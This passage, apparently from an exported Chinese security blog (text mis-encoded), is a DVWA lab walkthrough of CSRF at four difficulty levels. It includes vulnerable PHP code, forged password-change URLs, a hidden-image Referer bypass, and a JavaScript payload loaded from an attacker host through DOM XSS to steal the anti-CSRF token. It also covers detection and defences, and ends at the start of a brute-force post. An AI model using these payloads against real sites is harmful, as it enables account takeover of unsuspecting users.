    <content type="text"><![CDATA[IntroductionCSRFï¼ˆCross-site request forgeryï¼‰è·¨ç«™è¯·æ±‚ä¼ªé€ : ä¸»è¦åˆ©ç”¨å—å®³è€…å°šæœªå¤±æ•ˆçš„èº«ä»½è®¤è¯ä¿¡æ¯ï¼ˆcookieã€ä¼šè¯ç­‰ï¼‰ï¼Œè¯±éª—å…¶ç‚¹å‡»æ¶æ„é“¾æŽ¥æˆ–è€…è®¿é—®åŒ…å«æ”»å‡»ä»£ç çš„é¡µé¢ï¼Œåœ¨å—å®³äººä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ä»¥å—å®³è€…çš„èº«ä»½å‘ï¼ˆèº«ä»½è®¤è¯ä¿¡æ¯æ‰€å¯¹åº”çš„ï¼‰æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»Žè€Œå®Œæˆéžæ³•æ“ä½œï¼ˆå¦‚è½¬è´¦ã€æ”¹å¯†ç­‰ï¼‰ã€‚ è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰ä¸Žè·¨ç«™è¯·æ±‚ä¼ªé€ (CSRF)åŒºåˆ«XSSåˆ©ç”¨ç«™ç‚¹å†…çš„ä¿¡ä»»ç”¨æˆ·ï¼Œè€ŒCSRFåˆ™é€šè¿‡ä¼ªè£…æ¥è‡ªå—ä¿¡ä»»ç”¨æˆ·çš„è¯·æ±‚æ¥åˆ©ç”¨å—ä¿¡ä»»çš„ç½‘ç«™ã€‚CSRFä¸ŽXSSæœ€å¤§çš„åŒºåˆ«å°±åœ¨äºŽï¼ŒCSRFå¹¶æ²¡æœ‰ç›—å–cookieè€Œæ˜¯ç›´æŽ¥åˆ©ç”¨ã€‚ Low æœåŠ¡ç«¯æºä»£ç &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; åˆ†æž1ã€åˆ¤æ–­æ˜¯å¦è®¾ç½®äº†Changeå˜é‡ 2ã€æ–°è®¾ç½®çš„å¯†ç ä¸Žç¡®è®¤å¯†ç æ˜¯å¦ç›¸åŒ 3ã€ç›¸åŒåˆ™å°†æ–°å¯†ç åšmd5ç„¶åŽåšupdate 4ã€å¯ä»¥çœ‹åˆ°å¹¶æ²¡æœ‰éªŒè¯æ–°æ—§å¯†ç ç›¸åŒï¼Œæ²¡æœ‰ä»»ä½•çš„é˜²CSRFæœºåˆ¶ï¼ˆå½“ç„¶æœåŠ¡å™¨å¯¹è¯·æ±‚çš„å‘é€è€…æ˜¯åšäº†èº«ä»½éªŒè¯çš„ï¼Œæ˜¯æ£€æŸ¥çš„cookieï¼Œåªæ˜¯è¿™é‡Œçš„ä»£ç æ²¡æœ‰ä½“çŽ°ï¼‰ æ¼æ´žåˆ©ç”¨1ã€è§‚å¯Ÿè¯·æ±‚æ–¹å¼ /dvwa/vulnerabilities/csrf/?password_new=test1&amp;password_conf=test1&amp;Change=Change 2ã€æž„é€ urlæ›´æ”¹ç‚¹å‡»ç‚¹å‡»é“¾æŽ¥å—å®³è€…çš„å¯†ç  /dvwa/vulnerabilities/csrf/?password_new=yourpasswd&amp;password_conf=yourpasswd&amp;Change=Change å½“å—å®³äººåˆšåˆšç™»å…¥è®¿é—®äº†è¯¥ç«™ç‚¹ï¼Œsessionæ²¡æœ‰å¤±æ•ˆï¼Œç‚¹å‡»äº†è¿™ä¸ªé“¾æŽ¥åŽä»–çš„å¯†ç å°±ä¼šå˜æˆæˆ‘ä»¬æž„é€ å¥½çš„å¯†ç ï¼Œä¸ºäº†å¢žåŠ éšè”½æ€§å¯ä»¥å°†urlæ¢æˆçŸ­urlï¼Œæ›´é«˜çº§çš„å¯ä»¥åˆ¶ä½œä¸€ä¸ªæ”»å‡»çš„é¡µé¢ï¼Œè®©å—å®³è€…è®¿é—®ï¼Œä¸çŸ¥ä¸è§‰å®Œæˆæ”»å‡»ï¼ˆæ³¨æ„ä½¿ç”¨ç›¸åŒçš„æµè§ˆå™¨ï¼‰ MiddleæœåŠ¡ç«¯æºä»£ç CSRF Source &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // Checks to see where the request came from if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) { // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } } else { // Didn&apos;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; åˆ†æžä¸Žä¹‹å‰ç›¸æ¯”ï¼Œè¿™é‡Œæ£€æŸ¥äº†æ˜¯å¦åŒæº if( stripos( $_SERVER[ â€˜HTTP_REFERERâ€™ ] ,$_SERVER[ â€˜SERVER_NAMEâ€™ ]) int eregi(string pattern, string string) æ£€æŸ¥stringä¸­æ˜¯å¦å«æœ‰patternï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œå¦‚æžœæœ‰è¿”å›žTrueï¼Œåä¹‹Falseã€‚ å¯ä»¥çœ‹åˆ°ï¼ŒMediumçº§åˆ«çš„ä»£ç æ£€æŸ¥äº†ä¿ç•™å˜é‡ HTTP_REFERERï¼ˆhttpåŒ…å¤´çš„Refererå‚æ•°çš„å€¼ï¼Œè¡¨ç¤ºæ¥æºåœ°å€ï¼‰ä¸­æ˜¯å¦åŒ…å«SERVER_NAMEï¼ˆhttpåŒ…å¤´çš„Hostå‚æ•°ï¼ŒåŠè¦è®¿é—®çš„ä¸»æœºåï¼Œè¿™é‡Œæ˜¯192.168.xx.xxï¼‰ï¼Œå¸Œæœ›é€šè¿‡è¿™ç§æœºåˆ¶æŠµå¾¡CSRFæ”»å‡»ã€‚ æ¼æ´žåˆ©ç”¨è¿‡æ»¤è§„åˆ™æ˜¯httpåŒ…å¤´çš„Refererå‚æ•°çš„å€¼ä¸­å¿…é¡»åŒ…å«ä¸»æœºåï¼ˆè¿™é‡Œæ˜¯192.168.xx.xxï¼‰æˆ‘ä»¬å¯ä»¥å°†æ”»å‡»é¡µé¢å‘½åä¸º192.168.10.11.htmlï¼ˆé¡µé¢è¢«æ”¾ç½®åœ¨æ”»å‡»è€…çš„æœåŠ¡å™¨é‡Œï¼Œè¿™é‡Œæ˜¯192.168.10.10ï¼‰å°±å¯ä»¥ç»•è¿‡äº† &lt;img src=&quot;http://192.168.10.11/dvwa/pvulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt; &lt;h1&gt;404&lt;h1&gt; &lt;h2&gt;file not found.&lt;h2&gt; æŠ“åŒ…åŽåœ¨Repeaterä¸­ä¿®æ”¹HTTPæ•°æ®åŒ…ä¸­çš„Refererå‚æ•°ä¸º http://192.168.10.10/admin/test_csrf_192.168.10.11.html HighæœåŠ¡ç«¯æºä»£ç &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; åˆ†æžå…³é”®ä»£ç  // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Generate Anti-CSRF token generateSessionToken(); Highçº§åˆ«çš„å¸¦å…¥å¼•å…¥äº†Anti-CSRF token,ç”¨æˆ·æ¯æ¬¡è®¿é—®æ”¹å¯†é¡µé¢æ—¶ï¼ŒæœåŠ¡å™¨ä¼šé€šè¿‡generateSessionToken()è¿”å›žä¸€ä¸ªéšæœºçš„tokenï¼Œå‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ—¶ï¼Œéœ€è¦æäº¤tokenå‚æ•°ï¼Œè€ŒæœåŠ¡å™¨åœ¨æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œä¼šä¼˜å…ˆæ£€æŸ¥tokenï¼Œåªæœ‰å®¢æˆ·ç«¯æäº¤çš„tokenå‚æ•°ä¸ŽæœåŠ¡å™¨ç«¯ä¸€è‡´æ—¶ï¼ŒæœåŠ¡å™¨ç«¯æ‰ä¼šå¤„ç†å®¢æˆ·ç«¯çš„å“åº”ã€‚ æ¼æ´žåˆ©ç”¨è¦ç»•è¿‡High Security Levelçš„åCSRFæœºåˆ¶ï¼Œå…³é”®æ˜¯è¦èŽ·å–tokenï¼Œè¦åˆ©ç”¨å—å®³è€…çš„cookieåŽ»ä¿®æ”¹å¯†ç çš„é¡µé¢èŽ·å–å…³é”®çš„tokenã€‚ 1ã€è¯•ç€åŽ»æž„é€ ä¸€ä¸ªæ”»å‡»é¡µé¢ï¼Œå°†å…¶æ”¾ç½®åœ¨æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œå¼•è¯±å—å®³è€…è®¿é—®ï¼Œä»Žè€Œå®ŒæˆCSRFæ”»å‡»ï¼Œä¸‹é¢æ˜¯ä»£ç ã€‚ xss.js alert(document.cookie); var theUrl = &apos;http://192.168.10.11/dvwa/vulnerabilities/csrf/&apos;; if(window.XMLHttpRequest) { xmlhttp = new XMLHttpRequest(); }else{ xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); } var count = 0; xmlhttp.withCredentials = true; xmlhttp.onreadystatechange=function(){ if(xmlhttp.readyState ==4 &amp;&amp; xmlhttp.status==200) { var text = xmlhttp.responseText; var regex = /user_token\&apos; value\=\&apos;(.*?)\&apos; \/\&gt;/; var match = text.match(regex); console.log(match); alert(match[1]); var token = match[1]; var new_url = &apos;http://192.168.10.11/dvwa/vulnerabilities/csrf/?user_token=&apos;+token+&apos;&amp;password_new=test&amp;password_conf=test&amp;Change=Change&apos;; if(count==0){ count++; xmlhttp.open(&quot;GET&quot;,new_url,false); xmlhttp.send(); } } }; xmlhttp.open(&quot;GET&quot;,theUrl,false); xmlhttp.send(); xss.jsæ”¾ç½®äºŽæ”»å‡»è€…çš„ç½‘ç«™ä¸Šï¼šhttp://192.168.10.10/admin/xss.js 2ã€DOM XSSä¸ŽCSRFç»“åˆï¼š CSRFç»“åˆåŒSecurity Levelçš„DOM XSSï¼Œé€šè¿‡ajaxå®žçŽ°è·¨åŸŸè¯·æ±‚æ¥èŽ·å–ç”¨æˆ·çš„user_tokenï¼Œç”¨ä»¥ä¸‹é“¾æŽ¥æ¥è®©å—å®³è€…è®¿é—®ï¼š http://192.168.10.11/dvwa/vulnerabilities/xss_d/?default=English#%3Cscript%20src=%22http://192.168.10.10/admin/xss.js%22%3E%3C/script%3E æˆåŠŸä¿®æ”¹å¯†ç ä¸ºtest Impossible æœåŠ¡ç«¯æºä»£ç &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $pass_curr = $_GET[ &apos;password_current&apos; ]; $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Sanitise current password input $pass_curr = stripslashes( $pass_curr ); $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_curr = md5( $pass_curr ); // Check that the current password is correct $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR ); $data-&gt;execute(); // Do both new passwords match and does the current password match the user? if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) { // It does! $pass_new = stripslashes( $pass_new ); $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update database with new password $data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; ); $data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR ); $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;execute(); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; åˆ†æžå…³é”®ä»£ç  // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); / Generate Anti-CSRF token generateSessionToken(); åˆ©ç”¨PDOæŠ€æœ¯é˜²å¾¡SQLæ³¨å…¥ï¼Œéœ€è¦è¾“å…¥åŽŸå¯†ç æ¥è¿›è¡ŒéªŒè¯ï¼Œåœ¨ä¸çŸ¥é“åŽŸå¯†ç çš„æƒ…å†µä¸‹æ— æ³•è¿›è¡Œæ”»å‡» $pass_curr = stripslashes( $pass_curr ); // Check that the current password is correct $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR ); $data-&gt;execute(); CSRFæ¼æ´žçš„åˆ†ç±»åŠæ£€æµ‹æŒ–æŽ˜æ–¹æ³•ä¸»è¦æœ‰ä¸‰ç§ï¼šç¬¬ä¸€ç§ï¼šè¯·æ±‚ç›´æŽ¥æ˜¯ä¸ªGETè¯·æ±‚ï¼Œç„¶åŽè¯·æ±‚ä¸­æ²¡æœ‰tokenéªŒè¯å‚æ•°ï¼Œç„¶åŽè¿˜æœ‰ä¸€ä¸ªå›ºå®šçš„å˜é‡å¯ä»¥è¢«æŽ§åˆ¶ã€‚è¿™ç§æ˜¯æ¯”è¾ƒå¸¸è§çš„ä¸€ç§CSRFæ¼æ´žã€‚ æ£€æµ‹æ–¹æ³•ï¼šç½‘é¡µæ“ä½œæŸåŠŸèƒ½ï¼ŒæŠ“åŒ…åŽï¼Œå¦‚æžœå‘çŽ°æ»¡è¶³ä¸Šé¢æ¡ä»¶ï¼Œç„¶åŽå†åŽ»é¡µé¢æµ‹è¯•ä¸‹ï¼ŒåŸºæœ¬å°±å¯ä»¥ç¡®å®šå­˜åœ¨ä¸å­˜åœ¨CSRFæ¼æ´žäº†ã€‚ ç¬¬äºŒç§ï¼šè¯·æ±‚æ˜¯ä¸ªPOSTè¯·æ±‚ï¼Œpostè¯·æ±‚ä¸­æ²¡æœ‰tokenå‚æ•°ï¼Œç„¶åŽè¯·æ±‚ä¹Ÿæ²¡æœ‰éªŒè¯refererä¿¡æ¯ã€‚è¿™ç§æ˜¯å­˜åœ¨CSRFæƒ…å†µæœ€å¤šçš„ä¸€ç§ã€‚ æ£€æµ‹æ–¹æ³•ï¼šç½‘é¡µæ“ä½œæŸåŠŸèƒ½ï¼ŒæŠ“åŒ…åŽï¼Œå¦‚æžœå‘çŽ°æ²¡æœ‰tokenç­‰å‚æ•°ï¼Œç„¶åŽå°±å°†refererä¿¡æ¯è®¾ç½®ä¸ºç©ºï¼Œå†æ¬¡å‘åŒ…è¯·æ±‚ï¼Œå¦‚æžœè¯·æ±‚æˆåŠŸäº†ï¼Œå°±è¯´æ˜Žè¿™é‡Œæœ‰CSRFæ¼æ´žã€‚å¦‚æžœæœ‰tokenç­‰å‚æ•°ï¼Œå¯ä»¥å°è¯•å°†tokenåŽ»æŽ‰ï¼Œç„¶åŽå†å°†refererä¹ŸåŽ»æŽ‰ï¼Œè¿›è¡ŒéªŒè¯ã€‚è¿™ç§CSRFæ¼æ´žçš„åˆ©ç”¨ï¼Œæ˜¯éœ€è¦åœ¨è‡ªå·±æœåŠ¡å™¨æž„é€ ä¸€ä¸ªformè¡¨å•çš„ï¼Œç„¶åŽå°†æœåŠ¡å™¨formè¡¨å•çš„URLä½œä¸ºCSRFæ”»å‡»è¿›è¡Œåˆ©ç”¨çš„ï¼Œæˆ–è€…ç”¨jsä»£ç ç”Ÿæˆformè¡¨å•ï¼Œæˆ–è€…ç”¨ajaxå®žçŽ°ã€‚ ç¬¬ä¸‰ç§ï¼šè¯·æ±‚æ˜¯POSTï¼Œpostè¯·æ±‚ä¸­æ²¡æœ‰tokenå‚æ•°ï¼Œä½†æ˜¯éªŒè¯äº†refererä¿¡æ¯ã€‚ç„¶è€Œå¯ä»¥å°†postè¯·æ±‚æ”¹å†™ä¸ºgetè¯·æ±‚ï¼Œç„¶åŽé€šè¿‡ç¬¬ä¸€ç§æƒ…å†µä¸‹çš„é‚£ä¸ªæ–¹æ³•åˆ©ç”¨ã€‚ æ£€æµ‹æ–¹æ³•ï¼šå°±æ˜¯å…ˆæ‰§è¡Œäº†ç¬¬äºŒç§çš„éªŒè¯åŽï¼Œå‘çŽ°æœ‰å¯¹CSRFè¿›è¡Œé˜²å¾¡ã€‚ç„¶åŽå°†postè¯·æ±‚æ”¹å†™ä¸ºGETè¯·æ±‚ï¼Œå‘çŽ°ä»ç„¶å¯ä»¥æˆåŠŸæ‰§è¡Œã€‚æ¼æ´žæˆå› æ˜¯å› ä¸ºæœåŠ¡å™¨ç«¯æŽ¥æ”¶è¯·æ±‚å‚æ•°çš„æ—¶å€™ï¼Œæ²¡æœ‰ä¸¥æ ¼çš„ç”¨$_POST è€Œæ˜¯ç”¨çš„ç±»ä¼¼äºŽ $_REQUESTè¿™ç§postï¼Œgetè¯·æ±‚çš„å‚æ•°éƒ½å¯ä»¥æŽ¥æ”¶çš„å†™æ³•ã€‚ é˜²æŠ¤æŽªæ–½ä¸»è¦å¯ä»¥åº”ç”¨ä»¥ä¸‹ä»‹ç»çš„å‡ ç§æ–¹æ³•ï¼š é™åˆ¶éªŒè¯cookieçš„åˆ°æœŸæ—¶é—´ï¼šè¿™äº›cookieçš„åˆæ³•æ—¶é—´è¶ŠçŸ­ï¼Œé»‘å®¢åˆ©ç”¨ä½ çš„Webåº”ç”¨ç¨‹åºçš„æœºä¼šå°±è¶Šå°ã€‚ä¸è¿‡ï¼Œè¿™ä¸ªæ—¶é—´è¶ŠçŸ­ï¼Œç”¨æˆ·å°±è¶Šä¸æ–¹ä¾¿ã€‚å› æ­¤ï¼Œä½ éœ€è¦åœ¨å®‰å…¨æ€§å’Œæ–¹ä¾¿æ€§ä¹‹é—´è¿›è¡Œå¹³è¡¡ã€‚ æ‰§è¡Œé‡è¦ä¸šåŠ¡ä¹‹å‰ï¼Œè¦æ±‚ç”¨æˆ·æäº¤é¢å¤–çš„ä¿¡æ¯ï¼šè¦æ±‚ç”¨æˆ·åœ¨è¿›è¡Œé‡è¦ä¸šåŠ¡å‰è¾“å…¥å£ä»¤ï¼Œè¿™å¯ä»¥é˜²æ­¢é»‘å®¢å‘åŠ¨CSRFæ”»å‡»ï¼ˆåªè¦æµè§ˆå™¨ä¸­æ²¡æœ‰åŒ…å«å£ä»¤ï¼‰ï¼Œå› ä¸ºè¿™ç§é‡è¦ä¿¡æ¯æ— æ³•é¢„æµ‹æˆ–è½»æ˜“èŽ·å¾—ã€‚ ä½¿ç”¨ç§˜å¯†çš„æ— æ³•é¢„æµ‹çš„éªŒè¯ç¬¦å·ï¼šå½“ä¿å­˜åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­çš„cookieä»…ç”±ä¸€æ¬¡ä¼šè¯ç¡®è®¤æ—¶ï¼ŒCSRFæ”»å‡»æ‰ä¼šæœ‰æ•ˆã€‚æ‰€ä»¥åœ¨æ¯æ¬¡HTTPè¯·æ±‚ï¼ˆå½“ç„¶æ”»å‡»è€…æ— æ³•æå‰çŸ¥é“ï¼‰ä¸­éƒ½æœ‰é™„åŠ çš„ç‰¹å®šä¼šè¯çš„ä¿¡æ¯ï¼Œè¿™æ ·å°±å¯ä»¥æŒ«è´¥CSRFæ”»å‡»ã€‚ä¸è¿‡ï¼Œå¦‚æžœè¿™ç§åº”ç”¨ç¨‹åºå­˜åœ¨è·¨ç«™è„šæœ¬æ¼æ´žï¼Œé»‘å®¢å°±æœ‰å¯èƒ½è®¿é—®è¿™ç§éªŒè¯ç¬¦å·ã€‚ ä½¿ç”¨å®šåˆ¶çš„HTTPæŠ¥å¤´ï¼šå¦‚æžœæ‰§è¡Œäº¤æ˜“çš„æ‰€æœ‰è¯·æ±‚éƒ½ä½¿ç”¨XMLHttpRequestå¹¶é™„åŠ ä¸€ä¸ªå®šåˆ¶çš„HTTPæŠ¥å¤´ï¼ŒåŒæ—¶æ‹’ç»ç¼ºå°‘å®šåˆ¶æŠ¥å¤´çš„ä»»ä½•è¯·æ±‚ï¼Œå°±å¯ä»¥ç”¨XMLHttpRequest APIæ¥é˜²å¾¡CSRFæ”»å‡»ã€‚ç”±äºŽæµè§ˆå™¨é€šå¸¸ä»…å‡†è®¸ç«™ç‚¹å°†å®šåˆ¶çš„HTTPæŠ¥å¤´å‘é€ç»™ç›¸åŒç«™ç‚¹ï¼Œä»Žè€Œäº†é˜²æ­¢ç”±CSRFæ”»å‡»çš„æºç«™ç‚¹æ‰€å‘èµ·çš„äº¤æ˜“ã€‚ æ£€æŸ¥è®¿é—®æºçš„æŠ¥å¤´ï¼šåœ¨æµè§ˆè€…å‘é€HTTPè¯·æ±‚æ—¶ï¼Œå®ƒé€šå¸¸ä¼šåŒ…å«æºè‡ªè®¿é—®æºæŠ¥å¤´çš„URLã€‚ç†è®ºä¸Šè®²ï¼Œä½ å¯ä»¥ä½¿ç”¨è¿™äº›ä¿¡æ¯æ¥é˜»æ­¢æºè‡ªå…¶å®ƒä»»ä½•ç«™ç‚¹ï¼ˆè€Œä¸æ˜¯æ¥è‡ªWebåº”ç”¨ç¨‹åºè‡ªèº«ï¼‰çš„è¯·æ±‚ã€‚ä¸è¿‡ï¼Œè®¿é—®æºæŠ¥å¤´å¹¶ä¸æ€»æ˜¯å¯ç”¨çš„ï¼Œï¼ˆä¾‹å¦‚ï¼Œæœ‰äº›å•ä½ç”±äºŽç§å¯†æ€§çš„ç¼˜æ•…è€Œå°†å®ƒå‰¥ç¦»äº†ï¼‰ï¼Œæˆ–è€…è¿™ä¸ªæŠ¥å¤´å®¹æ˜“è¢«æ¬ºéª—ï¼Œæ‰€ä»¥è¯´ï¼Œè¿™æ¡æŽªæ–½å¹¶ä¸çœŸæ­£æœ‰æ•ˆã€‚ å‚è€ƒç™½å¸½å­æŒ–æ´žâ€”è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰ç¯‡ DVWA CSRF é€šå…³æ•™ç¨‹]]></content>
      <tags>
        <tag>CSRF</tag>
        <tag>DVWA</tag>
        <tag>practice</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-Brute_Force]]></title>
    <url>%2F2018%2F07%2F23%2FDVWA-Brute_Force%2F</url>
    <content type="text"><![CDATA[Vulnerability: Brute ForceLow æºä»£ç &lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // Get username $user = $_GET[ &apos;username&apos; ]; // Get password $pass = $_GET[ &apos;password&apos; ]; $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; åˆ†æžæ­£å¸¸çš„ç™»å…¥ç•Œé¢ï¼Œæ²¡æœ‰éªŒè¯ç å’Œæ¬¡æ•°é™åˆ¶ï¼Œæ²¡æœ‰ä»»ä½•æ”¾çˆ†ç ´æœºåˆ¶ï¼Œä¸”å­˜åœ¨SQLæ³¨å…¥ã€‚ æ¼æ´žåˆ©ç”¨ä½¿ç”¨Burpsuitçˆ†ç ´1ã€brupsuitæŠ“åŒ…å³é”®å‘é€åˆ°Intruder2ã€Attack type é€‰ Cluster bombcluster bomb - 